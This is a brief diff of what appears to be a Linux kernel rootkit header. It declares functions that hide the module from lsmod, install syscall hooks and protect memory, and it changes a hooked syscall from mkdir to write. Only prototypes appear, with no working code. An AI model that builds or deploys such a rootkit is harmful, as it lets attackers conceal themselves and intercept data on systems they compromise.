@@ -43,7 +43,7 @@ void hide_from_lsmod(void);
 int handle_signal_send(struct kprobe *kp, struct pt_regs *regs);
 
 // Hook sur syscall
-asmlinkage int hook_mkdir(const struct pt_regs *regs);
+asmlinkage int hook_write(struct pt_regs *regs);
 int __init rootkit_init_hook(void);
 void __exit rootkit_exit_hook(void);
 inline void protect_memory(void);
